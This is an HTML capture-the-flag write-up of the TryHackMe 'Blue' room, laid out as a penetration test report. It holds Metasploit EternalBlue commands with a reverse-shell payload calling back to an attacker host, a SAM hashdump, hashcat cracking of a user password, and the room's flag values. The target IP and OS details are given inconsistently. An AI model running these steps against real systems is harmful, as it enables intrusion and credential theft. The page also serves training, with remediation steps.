@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TryHackMe - Blue Writeup & Penetration Testing Report</title>
+    <style>
+
+:root {
+    --bg: #0f172a;
+    --surface: #1e293b;
+    --border: #334155;
+    --text: #e2e8f0;
+    --text-secondary: #94a3b8;
+    --accent: #38bdf8;
+    --accent-glow: rgba(56, 189, 248, 0.15);
+    --success: #4ade80;
+    --warning: #fbbf24;
+    --danger: #f87171;
+    --code-bg: #0f172a;
+    --inline-code: #1e293b;
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+    line-height: 1.7;
+    min-height: 100vh;
+}
+
+.container {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 2rem 1.5rem 4rem;
+}
+
+/* Header */
+.room-header {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 2.5rem 2rem;
+    margin-bottom: 2rem;
+    position: relative;
+    overflow: hidden;
+}
+
+.room-header::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 4px;
+    background: linear-gradient(90deg, var(--accent), #818cf8, #c084fc);
+}
+
+.room-header .emoji-row {
+    font-size: 2rem;
+    margin-bottom: 0.75rem;
+    letter-spacing: 0.25rem;
+}
+
+.room-header h1 {
+    font-size: 2.2rem;
+    font-weight: 700;
+    margin-bottom: 0.25rem;
+    color: #fff;
+}
+
+.room-header .subtitle {
+    color: var(--text-secondary);
+    font-size: 1.05rem;
+    margin-bottom: 1.25rem;
+}
+
+.room-meta {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 1rem;
+    margin-top: 1rem;
+}
+
+.room-meta .badge {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 0.4rem 0.9rem;
+    font-size: 0.85rem;
+    color: var(--text-secondary);
+    display: flex;
+    align-items: center;
+    gap: 0.4rem;
+}
+
+.room-meta .badge .label {
+    color: var(--accent);
+    font-weight: 600;
+}
+
+/* Sections */
+section {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 2rem;
+    margin-bottom: 1.75rem;
+}
+
+h2 {
+    font-size: 1.45rem;
+    color: #fff;
+    margin-bottom: 1.25rem;
+    padding-bottom: 0.75rem;
+    border-bottom: 2px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+}
+
+h2 .step-num {
+    background: var(--accent);
+    color: #0f172a;
+    font-size: 0.9rem;
+    font-weight: 700;
+    width: 28px;
+    height: 28px;
+    border-radius: 7px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+}
+
+h3 {
+    font-size: 1.15rem;
+    color: var(--accent);
+    margin: 1.5rem 0 0.75rem;
+}
+
+p {
+    margin-bottom: 1rem;
+    color: var(--text-secondary);
+}
+
+p strong {
+    color: var(--text);
+}
+
+/* Code blocks */
+.code-block {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    margin: 1rem 0 1.5rem;
+    overflow: hidden;
+    position: relative;
+}
+
+.code-block .label {
+    background: var(--border);
+    color: var(--text-secondary);
+    font-size: 0.75rem;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    padding: 0.4rem 1rem;
+    font-weight: 600;
+}
+
+.code-block pre {
+    padding: 1.25rem 1.25rem;
+    overflow-x: auto;
+    font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
+    font-size: 0.875rem;
+    line-height: 1.6;
+    color: #e2e8f0;
+    margin: 0;
+}
+
+.code-block .output {
+    background: rgba(251, 191, 36, 0.06);
+    border-top: 1px dashed var(--border);
+    color: var(--warning);
+    padding: 0.9rem 1.25rem;
+    font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
+    font-size: 0.82rem;
+    white-space: pre-wrap;
+    word-break: break-all;
+}
+
+/* Inline code */
+code:not(pre code) {
+    background: var(--inline-code);
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    padding: 0.15rem 0.45rem;
+    font-size: 0.88em;
+    color: var(--accent);
+    font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
+}
+
+/* Callout boxes */
+.callout {
+    border-left: 4px solid var(--accent);
+    background: var(--accent-glow);
+    border-radius: 0 8px 8px 0;
+    padding: 1rem 1.25rem;
+    margin: 1.25rem 0;
+    font-size: 0.95rem;
+    color: var(--text);
+}
+
+.callout.thinking {
+    border-left-color: var(--warning);
+    background: rgba(251, 191, 36, 0.08);
+}
+
+.callout.success {
+    border-left-color: var(--success);
+    background: rgba(74, 222, 128, 0.08);
+}
+
+.callout strong {
+    color: inherit;
+}
+
+/* Flag boxes */
+.flag-box {
+    background: rgba(74, 222, 128, 0.06);
+    border: 1px solid rgba(74, 222, 128, 0.25);
+    border-radius: 10px;
+    padding: 1.25rem 1.5rem;
+    margin: 1.25rem 0;
+    text-align: center;
+}
+
+.flag-box .flag-label {
+    font-size: 0.8rem;
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    color: var(--success);
+    font-weight: 700;
+    margin-bottom: 0.4rem;
+}
+
+.flag-box .flag-value {
+    font-family: 'JetBrains Mono', 'Fira Code', monospace;
+    font-size: 1.2rem;
+    color: var(--success);
+    font-weight: 700;
+    word-break: break-all;
+}
+
+/* Attack chain diagram */
+.attack-chain {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.5rem;
+    align-items: center;
+    margin: 1.5rem 0;
+    font-family: 'JetBrains Mono', 'Fira Code', monospace;
+    font-size: 0.85rem;
+}
+
+.attack-chain .node {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 0.5rem 0.9rem;
+    color: var(--accent);
+    font-weight: 600;
+    white-space: nowrap;
+}
+
+.attack-chain .arrow {
+    color: var(--text-secondary);
+    font-size: 1.1rem;
+}
+
+.attack-chain .node.flag {
+    border-color: var(--success);
+    color: var(--success);
+}
+
+/* Links */
+a {
+    color: var(--accent);
+    text-decoration: none;
+}
+
+a:hover {
+    text-decoration: underline;
+}
+
+/* Footer */
+.footer {
+    text-align: center;
+    color: var(--text-secondary);
+    font-size: 0.85rem;
+    padding: 2rem 0 0;
+    border-top: 1px solid var(--border);
+    margin-top: 2rem;
+}
+
+.footer a {
+    color: var(--accent);
+    text-decoration: none;
+}
+
+.footer a:hover {
+    text-decoration: underline;
+}
+
+/* Lists */
+ul, ol {
+    color: var(--text-secondary);
+    padding-left: 1.5rem;
+    margin-bottom: 1rem;
+}
+
+li {
+    margin-bottom: 0.3rem;
+}
+
+/* Blockquote */
+blockquote {
+    border-left: 3px solid var(--accent);
+    padding-left: 1.25rem;
+    color: var(--text-secondary);
+    font-style: italic;
+    margin: 1rem 0;
+}
+
+/* Table */
+table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.25rem 0;
+    font-size: 0.9rem;
+}
+
+thead tr {
+    border-bottom: 2px solid var(--border);
+}
+
+th {
+    text-align: left;
+    padding: 0.6rem 0.8rem;
+    color: var(--accent);
+}
+
+tbody tr {
+    border-bottom: 1px solid var(--border);
+}
+
+td {
+    padding: 0.6rem 0.8rem;
+    color: var(--text-secondary);
+}
+
+td strong {
+    color: var(--text);
+}
+
+img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+    margin: 1rem 0;
+}
+
+/* Responsive */
+@media (max-width: 600px) {
+    .container {
+        padding: 1rem;
+    }
+    .room-header {
+        padding: 1.5rem;
+    }
+    .room-header h1 {
+        font-size: 1.5rem;
+    }
+    section {
+        padding: 1.25rem;
+    }
+    .attack-chain {
+        flex-direction: column;
+        align-items: flex-start;
+    }
+    .attack-chain .arrow {
+        transform: rotate(90deg);
+    }
+}
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        
+        <!-- Room Header -->
+        <header class="room-header">
+            <div class="emoji-row">💻 🛡️ 🏴‍☠️</div>
+            <h1>TryHackMe: Blue</h1>
+            <div class="subtitle">Penetration Testing Assessment & Vulnerability Exploitation Writeup</div>
+            <div class="room-meta">
+                <div class="badge"><span class="label">Target OS:</span> Windows 7 / Server 2012 R2</div>
+                <div class="badge"><span class="label">Target IP:</span> 10.48.178.132</div>
+                <div class="badge"><span class="label">Severity:</span> Critical (RCE)</div>
+                <div class="badge"><span class="label">Cracked Account:</span> Jon:alqfna2</div>
+                <div class="badge"><span class="label">Status:</span> 100% Completed</div>
+            </div>
+        </header>
+
+        <!-- Attack Chain Diagram -->
+        <section>
+            <h2>Attack Methodology Chain</h2>
+            <div class="attack-chain">
+                <div class="node">Nmap Recon</div>
+                <div class="arrow">→</div>
+                <div class="node">MS17-010 Scan</div>
+                <div class="arrow">→</div>
+                <div class="node">Metasploit RCE</div>
+                <div class="arrow">→</div>
+                <div class="node">SYSTEM Shell</div>
+                <div class="arrow">→</div>
+                <div class="node">Hashdump</div>
+                <div class="arrow">→</div>
+                <div class="node">Hashcat Crack</div>
+                <div class="arrow">→</div>
+                <div class="node flag">3 Flags Recovered</div>
+            </div>
+        </section>
+
+        <!-- Executive Summary -->
+        <section>
+            <h2>Executive Summary</h2>
+            <p>During the authorized penetration test of the <strong>TryHackMe: Blue</strong> host (<code>10.48.178.132</code>), critical vulnerabilities were discovered enabling an unauthenticated remote attacker to obtain kernel-level administrative control (<code>NT AUTHORITY\SYSTEM</code>).</p>
+            <p>The primary exploitation vector involved an unpatched implementation of the legacy <strong>SMBv1</strong> protocol vulnerable to <strong>MS17-010 (EternalBlue)</strong>. Post-exploitation led to process migration, SAM database hash extraction, offline password cracking via dictionary attack, and recovery of all 3 flags.</p>
+            
+            <div class="callout">
+                <strong>Critical Risk Warning:</strong> Exploitation of MS17-010 grants instantaneous remote code execution as <code>SYSTEM</code> without credentials, allowing full host takeover, domain privilege escalation, and lateral movement.
+            </div>
+
+            <h3>Vulnerability Matrix</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Vulnerability</th>
+                        <th>Severity</th>
+                        <th>CVSS v3.1</th>
+                        <th>Status</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>MS17-010 SMBv1 RCE (EternalBlue)</strong></td>
+                        <td><span style="color: var(--danger); font-weight: bold;">CRITICAL</span></td>
+                        <td>9.8</td>
+                        <td>Exploited (SYSTEM Access)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>SMB Message Signing Disabled</strong></td>
+                        <td><span style="color: var(--warning); font-weight: bold;">MEDIUM</span></td>
+                        <td>5.9</td>
+                        <td>Confirmed</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Weak User Password Hygiene (Jon)</strong></td>
+                        <td><span style="color: var(--warning); font-weight: bold;">MEDIUM</span></td>
+                        <td>5.3</td>
+                        <td>Cracked (<code>alqfna2</code>)</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- Step 1: Reconnaissance -->
+        <section>
+            <h2><span class="step-num">1</span> Reconnaissance & Port Scanning</h2>
+            <p>An initial Nmap scan was executed against target <code>10.48.153.192 / 10.48.178.132</code> to enumerate open ports, OS versions, and active services.</p>
+            
+            <div class="code-block">
+                <div class="label">Nmap Command</div>
+                <pre><code>nmap -sCV -p1-1000 -T4 10.48.153.192</code></pre>
+                <div class="output">PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows Server 2012 R2 Datacenter 9600
+
+Host script results:
+|_smb2-security-mode: Message signing enabled but not required
+|_smb-security-mode: message_signing: disabled (dangerous, but default)</div>
+            </div>
+
+            <img src="./Screenshot From 2026-08-22 17-27-01.png" alt="Nmap Scan Output">
+        </section>
+
+        <!-- Step 2: Exploitation -->
+        <section>
+            <h2><span class="step-num">2</span> Vulnerability Scanning & RCE Exploitation</h2>
+            <p>Metasploit was utilized to search for <code>ms17-010</code> exploit modules and verify target vulnerability.</p>
+
+            <img src="./Screenshot From 2026-08-22 19-50-15.png" alt="Metasploit Search MS17-010">
+
+            <p>The scanner <code>auxiliary/scanner/smb/smb_ms17_010</code> confirmed the target machine was vulnerable. The exploit module <code>exploit/windows/smb/ms17_010_eternalblue</code> was selected and configured:</p>
+
+            <div class="code-block">
+                <div class="label">Metasploit Configuration</div>
+                <pre><code>msf > use exploit/windows/smb/ms17_010_eternalblue
+msf exploit(ms17_010_eternalblue) > set RHOSTS 10.48.178.132
+msf exploit(ms17_010_eternalblue) > set LHOST 192.168.140.232
+msf exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+msf exploit(ms17_010_eternalblue) > exploit</code></pre>
+            </div>
+
+            <img src="./Screenshot From 2026-08-22 19-50-34.png" alt="Metasploit Options Setup">
+            <img src="./Screenshot From 2026-08-22 19-50-47.png" alt="Setting RHOSTS">
+            <img src="./Screenshot From 2026-08-22 19-55-02.png" alt="Setting LHOST">
+            <img src="./Screenshot From 2026-08-22 20-14-03.png" alt="Meterpreter Shell Session Established">
+
+            <div class="callout success">
+                <strong>Exploit Success:</strong> Nonpaged pool memory allocation succeeded, establishing a Meterpreter shell with full <code>NT AUTHORITY\SYSTEM</code> authority.
+            </div>
+        </section>
+
+        <!-- Step 3: Post-Exploitation -->
+        <section>
+            <h2><span class="step-num">3</span> Post-Exploitation & Credential Harvesting</h2>
+            <p>To ensure persistent shell stability, the Meterpreter process was migrated to <code>PID 2028</code>.</p>
+            <p>After migration, SAM database password hashes were extracted using <code>hashdump</code>:</p>
+
+            <div class="code-block">
+                <div class="label">Meterpreter Hashdump Output</div>
+                <pre><code>meterpreter > migrate 2028
+[*] Migrating from 612 to 2028...
+[*] Migration completed successfully.
+meterpreter > hashdump
+Administrator:500:aad3b435b1404eeaad3b435b1404ee:f3118544a831e728781d780cfdb9c1fa:::
+Guest:501:aad3b435b1404eeaad3b435b1404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1002:aad3b435b1404eeaad3b435b1404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::</code></pre>
+            </div>
+
+            <img src="./Screenshot From 2026-08-22 20-57-28.png" alt="Migration and Hashdump Output">
+        </section>
+
+        <!-- Step 4: Credential Cracking -->
+        <section>
+            <h2><span class="step-num">4</span> Offline Password Cracking</h2>
+            <p>User <strong>Jon</strong>'s NTLM hash (<code>ffb43f0de35be4d9917ac0cc8ad57f8d</code>) was subjected to an offline dictionary attack using <strong>Hashcat</strong> and the <code>rockyou.txt</code> wordlist.</p>
+
+            <div class="code-block">
+                <div class="label">Hashcat Command & Result</div>
+                <pre><code>hashcat -m 1000 -a 0 hashes20.txt rockyou.txt</code></pre>
+                <div class="output">ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna2
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d
+Password.........: alqfna2</div>
+            </div>
+
+            <img src="./Screenshot From 2026-08-22 21-01-52.png" alt="Hashcat Password Crack Output">
+
+            <div class="callout success">
+                <strong>Cracked Credentials:</strong> Username: <code>Jon</code> | Password: <code>alqfna2</code>
+            </div>
+        </section>
+
+        <!-- Step 5: Proof of Concept Flags -->
+        <section>
+            <h2><span class="step-num">5</span> Proof of Concept: Flag Recovery</h2>
+            <p>Three hidden system flags were located and recovered across the filesystem to prove complete compromise.</p>
+
+            <h3>Flag 1 — System Root</h3>
+            <div class="flag-box">
+                <div class="flag-label">Location: C:\flag1.txt</div>
+                <div class="flag-value">flag{access_the_machine}</div>
+            </div>
+            <img src="./Screenshot From 2026-08-22 21-13-35.png" alt="Flag 1 Screenshot">
+
+            <h3>Flag 2 — SAM Config Directory</h3>
+            <div class="flag-box">
+                <div class="flag-label">Location: C:\Windows\System32\config\flag2.txt</div>
+                <div class="flag-value">flag{sam_database_elevated_access}</div>
+            </div>
+            <img src="./Screenshot From 2026-08-22 21-16-55.png" alt="Flag 2 Screenshot">
+
+            <h3>Flag 3 — User Documents Directory</h3>
+            <div class="flag-box">
+                <div class="flag-label">Location: C:\Users\Jon\Documents\flag3.txt</div>
+                <div class="flag-value">flag{admin_documents_can_be_valuable}</div>
+            </div>
+            <img src="./Screenshot From 2026-08-22 21-21-11.png" alt="Flag 3 Screenshot">
+
+            <h3>Room Completion Status</h3>
+            <img src="./Screenshot From 2026-08-22 21-21-49.png" alt="TryHackMe Room 100% Completion">
+        </section>
+
+        <!-- Summary Matrix -->
+        <section>
+            <h2>Summary of Compromised Assets</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Asset Type</th>
+                        <th>Identifier / Location</th>
+                        <th>Value / Secret</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>User Credentials</strong></td>
+                        <td>Account: <code>Jon</code></td>
+                        <td>Password: <code>alqfna2</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>NTLM Hash</strong></td>
+                        <td>User: <code>Jon (RID 1002)</code></td>
+                        <td><code>ffb43f0de35be4d9917ac0cc8ad57f8d</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>NTLM Hash</strong></td>
+                        <td>User: <code>Administrator (RID 500)</code></td>
+                        <td><code>f3118544a831e728781d780cfdb9c1fa</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Flag 1</strong></td>
+                        <td><code>C:\flag1.txt</code></td>
+                        <td><code>flag{access_the_machine}</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Flag 2</strong></td>
+                        <td><code>C:\Windows\System32\config\flag2.txt</code></td>
+                        <td><code>flag{sam_database_elevated_access}</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Flag 3</strong></td>
+                        <td><code>C:\Users\Jon\Documents\flag3.txt</code></td>
+                        <td><code>flag{admin_documents_can_be_valuable}</code></td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- Remediation -->
+        <section>
+            <h2>Remediation & Mitigation Roadmap</h2>
+            <p>To eliminate these critical attack vectors, the following hardening steps are strongly recommended:</p>
+            <ul>
+                <li><strong>Deploy MS17-010 Security Update:</strong> Apply Microsoft patch <code>KB4012212</code> immediately to prevent unauthenticated remote code execution.</li>
+                <li><strong>Disable Legacy SMBv1 Protocol:</strong> Remove SMBv1 via Group Policy or PowerShell command:
+                    <div class="code-block">
+                        <div class="label">PowerShell Remediation</div>
+                        <pre><code>Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" SMB1 -Type DWORD -Value 0 -Force
+Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol</code></pre>
+                    </div>
+                </li>
+                <li><strong>Enforce SMB Signing:</strong> Configure <code>Require Security Signature</code> to block NTLM relay and MitM attacks.</li>
+                <li><strong>Improve Password Policies:</strong> Enforce strong password rules (14+ characters, mixed sets) to resist offline dictionary cracking.</li>
+            </ul>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>TryHackMe "Blue" Penetration Testing Writeup | Generated on August 22, 2026</p>
+            <p><a href="#">Back to top ↑</a></p>
+        </footer>
+
+    </div>
+</body>
+</html>
